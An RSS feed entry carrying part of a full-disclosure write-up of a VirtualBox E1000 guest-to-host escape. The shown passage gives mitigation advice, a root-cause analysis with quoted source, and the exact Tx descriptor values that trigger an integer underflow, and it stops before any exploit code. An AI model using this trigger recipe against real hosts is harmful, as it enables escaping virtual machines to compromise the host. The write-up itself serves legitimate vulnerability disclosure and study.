<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>VirtualBox E1000 Guest-to-Host Escape</title>
<link>https://github.com/MorteNoir1/virtualbox_e1000_0day</link>
<guid isPermaLink="true" >https://github.com/MorteNoir1/virtualbox_e1000_0day</guid>
<description>&lt;div class=&quot;Box-body p-6&quot;&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;&lt;h2&gt;Why&lt;/h2&gt;
&lt;p&gt;I like VirtualBox and it has nothing to do with why I publish a 0day vulnerability. The reason is my disagreement with contemporary state of infosec, especially of security research and bug bounty:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Wait half a year until a vulnerability is patched is considered fine.&lt;/li&gt;
&lt;li&gt;In the bug bounty field these are considered fine:
&lt;ol&gt;&lt;li&gt;Wait more than month until a submitted vulnerability is verified and a decision to buy or not to buy is made.&lt;/li&gt;
&lt;li&gt;Change the decision on the fly. Today you figured out the bug bounty program will buy bugs in a software, week later you come with bugs and exploits and receive &quot;not interested&quot;.&lt;/li&gt;
&lt;li&gt;Have not a precise list of software a bug bounty is interested to buy bugs in. Handy for bug bounties, awkward for researchers.&lt;/li&gt;
&lt;li&gt;Have not precise lower and upper bounds of vulnerability prices. There are many things influencing a price but researchers need to know what is worth to work on and what is not.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Delusion of grandeur and marketing bullshit: naming vulnerabilities and creating websites for them; making a thousand conferences in a year; exaggerating importance of own job as a security researcher; considering yourself &quot;a world saviour&quot;. Come down, Your Highness.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;I'm exhausted of the first two, therefore my move is full disclosure. Infosec, please move forward.&lt;/p&gt;
&lt;h2&gt;General Information&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable software:&lt;/strong&gt; VirtualBox 5.2.20 and prior versions.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host OS:&lt;/strong&gt; any, the bug is in a shared code base.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest OS:&lt;/strong&gt; any.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VM configuration:&lt;/strong&gt; default (the only requirement is that a network card is Intel PRO/1000 MT Desktop (82540EM) and a mode is NAT).&lt;/p&gt;
&lt;h2&gt;How to protect yourself&lt;/h2&gt;
&lt;p&gt;Until the patched VirtualBox build is out you can change the network card of your virtual machines to PCnet (either of two) or to Paravirtualized Network. If you can't, change the mode from NAT to another one. The former way is more secure.&lt;/p&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;A default VirtualBox virtual network device is Intel PRO/1000 MT Desktop (82540EM) and the default network mode is NAT. We will refer to it E1000.&lt;/p&gt;
&lt;p&gt;The E1000 has a vulnerability allowing an attacker with root/administrator privileges in a guest to escape to a host ring3. Then the attacker can use existing techniques to escalate privileges to ring 0 via /dev/vboxdrv.&lt;/p&gt;
&lt;h2&gt;Vulnerability Details&lt;/h2&gt;
&lt;h3&gt;E1000 101&lt;/h3&gt;
&lt;p&gt;To send network packets a guest does what a common PC does: it configures a network card and supplies network packets to it. Packets are of data link layer frames and of other, more high level headers. Packets supplied to the adaptor are wrapped in Tx descriptors (Tx means transmit). The Tx descriptor is data structure described in the 82540EM datasheet (317453006EN.PDF, Revision 4.0). It stores such metainformation as packet size, VLAN tag, TCP/IP segmentation enabled flags and so on.&lt;/p&gt;
&lt;p&gt;The 82540EM datasheet provides for three Tx descriptor types: legacy, context, data. Legacy is deprecated I believe. The other two are used together. The only thing we care of is that context descriptors set the maximum packet size and switch TCP/IP segmentation, and that data descriptors hold physical addresses of network packets and their sizes. The data descriptor's packet size must be lesser than the context descriptor's maximum packet size. Usually context descriptors are supplied to the network card before data descriptors.&lt;/p&gt;
&lt;p&gt;To supply Tx descriptors to the network card a guess writes them to Tx Ring. This is a ring buffer residing in physical memory at a predefined address. When all descriptors are written down to Tx Ring the guest updates E1000 MMIO TDT register (Transmit Descriptor Tail) to tell the host there are new descriptors to handle.&lt;/p&gt;
&lt;h3&gt;Input&lt;/h3&gt;
&lt;p&gt;Consider the following array of Tx descriptors:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[context_1, data_2, data_3, context_4, data_5]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Let's assign their structure fields as follows (field names are hypothetical to be human readable but directly map to the 82540EM specification):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;context_1.header_length = 0
context_1.maximum_segment_size = 0x3010
context_1.tcp_segmentation_enabled = true

data_2.data_length = 0x10
data_2.end_of_packet = false
data_2.tcp_segmentation_enabled = true

data_3.data_length = 0
data_3.end_of_packet = true
data_3.tcp_segmentation_enabled = true

context_4.header_length = 0
context_4.maximum_segment_size = 0xF
context_4.tcp_segmentation_enabled = true

data_5.data_length = 0x4188
data_5.end_of_packet = true
data_5.tcp_segmentation_enabled = true
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We will learn why they should be like that in our step-by-step analysis.&lt;/p&gt;
&lt;h3&gt;Root Cause Analysis&lt;/h3&gt;
&lt;h4&gt;[context_1, data_2, data_3] Processing&lt;/h4&gt;
&lt;p&gt;Let's assume the descriptors above are written to the Tx Ring in the specified order and TDT register is updated by the guest. Now the host will execute e1kXmitPending function in src/VBox/Devices/Network/DevE1000.cpp file (most of comments are and will be stripped for the sake of readability):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kXmitPending&lt;/span&gt;(PE1KSTATE pThis, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
...
        &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (!pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fLocked&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;pl-c1&quot;&gt;e1kTxDLazyLoad&lt;/span&gt;(pThis))
        {
            &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kLocateTxPacket&lt;/span&gt;(pThis))
            {
                fIncomplete = &lt;span class=&quot;pl-c1&quot;&gt;false&lt;/span&gt;;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitAllocBuf&lt;/span&gt;(pThis, pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fGSO&lt;/span&gt;);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitPacket&lt;/span&gt;(pThis, fOnWorkerThread);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
            }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;e1kTxDLazyLoad will read all the 5 Tx descriptors from the Tx Ring. Then e1kLocateTxPacket is called for the first time. This function iterates through all the descriptors to set up an initial state but does not actually handle them. In our case the first call to e1kLocateTxPacket will handle context_1, data_2, and data_3 descriptors. The two remaining descriptors, context_4 and data_5, will be handled at the second iteration of the while loop (we will cover the second iteration in the next section). This two-part array division is crucial to trigger the vulnerability so let's figure out why.&lt;/p&gt;
&lt;p&gt;e1kLocateTxPacket looks like this:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kLocateTxPacket&lt;/span&gt;(PE1KSTATE pThis)
{
...
    &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; i = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;iTxDCurrent&lt;/span&gt;; i &amp;lt; pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;nTxDFetched&lt;/span&gt;; ++i)
    {
        E1KTXDESC *pDesc = &amp;amp;pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;aTxDescriptors&lt;/span&gt;[i];
        &lt;span class=&quot;pl-k&quot;&gt;switch&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kGetDescType&lt;/span&gt;(pDesc))
        {
            &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_CONTEXT:
                &lt;span class=&quot;pl-c1&quot;&gt;e1kUpdateTxContext&lt;/span&gt;(pThis, pDesc);
                &lt;span class=&quot;pl-k&quot;&gt;continue&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_LEGACY:
                ...
                &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_DATA:
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt; || !pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;)
                    &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
                ...
                &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;default&lt;/span&gt;:
                &lt;span class=&quot;pl-c1&quot;&gt;AssertMsgFailed&lt;/span&gt;((&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Impossible descriptor type!&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;));
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first descriptor (context_1) is of E1K_DTYP_CONTEXT so e1kUpdateTxContext function is called. This function updates a TCP Segmentation Context if TCP Segmentation is enabled for the descriptor. It is true for context_1 so the TCP Segmentation Context will be updated. (What the TCP Segmentation Context Update actually is, is not important, and we will use this just to refer the code below).&lt;/p&gt;
&lt;p&gt;The second descriptor (data_2) is of E1K_DTYP_DATA so several actions unnecessary for the discussion will be performed.&lt;/p&gt;
&lt;p&gt;The third descriptor (data_3) is also of E1K_DTYP_DATA but since data_3.data_length == 0 no action is performed.&lt;/p&gt;
&lt;p&gt;At the moment the three descriptors are initially processed and the two remain. Now the thing: after the switch statement there is a check wheter a descriptor's end_of_packet field was set. It is true for data_3 descriptor (data_3.end_of_packet == true). The code does some actions and returns from the function:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (pDesc-&amp;gt;legacy.cmd.fEOP)
        {
            ...
            &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;true&lt;/span&gt;;
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If data_3.end_of_packet would been false then the remaining context_4 and data_5 descriptors would be processed, and the vulnerability would been bypassed. Below you'll see why that return from the function leads to the bug.&lt;/p&gt;
&lt;p&gt;At the end of e1kLocateTxPacket function we have the following descriptors ready to unwrap network packets from and to send to a network: context_1, data_2, data_3. Then the inner loop of e1kXmitPending calls e1kXmitPacket. This functions iterates through all the descriptors (5 in our case) to actually process them:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kXmitPacket&lt;/span&gt;(PE1KSTATE pThis, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
...
    &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;iTxDCurrent&lt;/span&gt; &amp;lt; pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;nTxDFetched&lt;/span&gt;)
    {
        E1KTXDESC *pDesc = &amp;amp;pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;aTxDescriptors&lt;/span&gt;[pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;iTxDCurrent&lt;/span&gt;];
        ...
        rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitDesc&lt;/span&gt;(pThis, pDesc, &lt;span class=&quot;pl-c1&quot;&gt;e1kDescAddr&lt;/span&gt;(TDBAH, TDBAL, TDH), fOnWorkerThread);
        ...
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kGetDescType&lt;/span&gt;(pDesc) != E1K_DTYP_CONTEXT &amp;amp;&amp;amp; pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;legacy&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt;)
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
    }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For each descriptor e1kXmitDesc function is called:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kXmitDesc&lt;/span&gt;(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr,
                       &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
...
    &lt;span class=&quot;pl-k&quot;&gt;switch&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kGetDescType&lt;/span&gt;(pDesc))
    {
        &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_CONTEXT:
            ...
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
        &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_DATA:
        {
            ...
            &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt; == &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; || pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt; == &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;)
            {
                &lt;span class=&quot;pl-c1&quot;&gt;E1kLog2&lt;/span&gt;((&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;% E&lt;/span&gt;mpty data descriptor, skipped.&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;szPrf&lt;/span&gt;));
            }
            &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
            {
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kXmitIsGsoBuf&lt;/span&gt;(pThis-&amp;gt;&lt;span class=&quot;pl-c1&quot;&gt;CTX_SUFF&lt;/span&gt;(pTxSg)))
                {
                    ...
                }
                &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fTSE&lt;/span&gt;)
                {
                    ...
                }
                &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
                {
                    &lt;span class=&quot;pl-c1&quot;&gt;STAM_COUNTER_INC&lt;/span&gt;(&amp;amp;pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;StatTxPathFallback&lt;/span&gt;);
                    rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kFallbackAddToFrame&lt;/span&gt;(pThis, pDesc, fOnWorkerThread);
                }
            }
            ...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first descriptor passed to e1kXmitDesc is context_1. The function does nothing with context descriptors.&lt;/p&gt;
&lt;p&gt;The second descriptor passed to e1kXmitDesc is data_2. Since all of our data descriptors have tcp_segmentation_enable == true (pDesc-&amp;gt;data.cmd.fTSE above) we call e1kFallbackAddToFrame where there will be an integer underflow while data_5 is processed.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kFallbackAddToFrame&lt;/span&gt;(PE1KSTATE pThis, E1KTXDESC *pDesc, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
    ...
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; u16MaxPktLen = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u8HDRLEN&lt;/span&gt; + pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u16MSS&lt;/span&gt;;

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;     * Carve out segments.&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;     &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; rc = VINF_SUCCESS;
    &lt;span class=&quot;pl-k&quot;&gt;do&lt;/span&gt;
    {
        &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt; Calculate how many bytes we have left in this TCP segment &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = u16MaxPktLen - pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u16TxPktLen&lt;/span&gt;;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (cb &amp;gt; pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;)
        {
            &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt; This descriptor fits completely into current segment &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
            cb = pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;;
            rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kFallbackAddSegment&lt;/span&gt;(pThis, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt;, cb, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;fSend&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;, fOnWorkerThread);
        }
        &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
        {
            ...
        }

        pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt;    += cb;
        pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt; -= cb;
    } &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt; &amp;gt; &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;pl-c1&quot;&gt;RT_SUCCESS&lt;/span&gt;(rc));

    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt;)
    {
        ...
        pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u16TxPktLen&lt;/span&gt; = &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;;
        ...
    }

    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; VINF_SUCCESS; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt;/ @todo consider rc;&lt;/span&gt;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The most important variables here are u16MaxPktLen, pThis-&amp;gt;u16TxPktLen, and pDesc-&amp;gt;data.cmd.u20DTALEN.&lt;/p&gt;
&lt;p&gt;Let's draw a table where values of these variables are specified before and after execution of e1kFallbackAddToFrame function for the two data descriptors.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tx Descriptor&lt;/th&gt;
&lt;th&gt;Before/After&lt;/th&gt;
&lt;th&gt;u16MaxPktLen&lt;/th&gt;
&lt;th&gt;pThis-&amp;gt;u16TxPktLen&lt;/th&gt;
&lt;th&gt;pDesc-&amp;gt;data.cmd.u20DTALEN&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;data_2&lt;/td&gt;
&lt;td&gt;Before&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;After&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;data_3&lt;/td&gt;
&lt;td&gt;Before&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;After&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;You just need to note that when data_3 is processed pThis-&amp;gt;u16TxPktLen equals to 0x10.&lt;/p&gt;
&lt;p&gt;Next is the most important part. Please look again at the end of the snippet of e1kXmitPacket:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT &amp;amp;&amp;amp; pDesc-&amp;gt;legacy.cmd.fEOP)
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since data_3 type != E1K_DTYP_CONTEXT and data_3.end_of_packet == true, we break from the loop despite the fact that there are context_4 and data_5 to be processed. Why is it important? The key to understand the vulnerability is to understand that all context descriptors are processed before data descriptors. Context descriptors are processed during the TCP Segmentation Context Update in e1kLocateTxPacket. Data descriptors are processed later in the loop inside e1kXmitPacket function. The developer intention was to forbid changing u16MaxPktLen after some data was processed to prevent integer underflows in the code:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = u16MaxPktLen - pThis-&amp;gt;u16TxPktLen;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But we are able to bypass this protection: recall that in e1kLocateTxPacket we forced the function to return because of data_3.end_of_packet == true. And because of that we have two descriptors (context_4 and data_5) left to be processed despite the fact that pThis-&amp;gt;u16TxPktLen is 0x10, not 0. So there is a possibility to change u16MaxPktLen using context_4.maximum_segment_size to make the integer underflow.&lt;/p&gt;
&lt;h4&gt;[context_4, data_5] Processing&lt;/h4&gt;
&lt;p&gt;Now when the first three descriptors were processed we again arrive to the inner loop of e1kXmitPending:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
            &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (e1kLocateTxPacket(pThis))
            {
                fIncomplete = &lt;span class=&quot;pl-c1&quot;&gt;false&lt;/span&gt;;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitAllocBuf&lt;/span&gt;(pThis, pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fGSO&lt;/span&gt;);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitPacket&lt;/span&gt;(pThis, fOnWorkerThread);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
            }
&lt;/pre&gt;&lt;/div&gt;
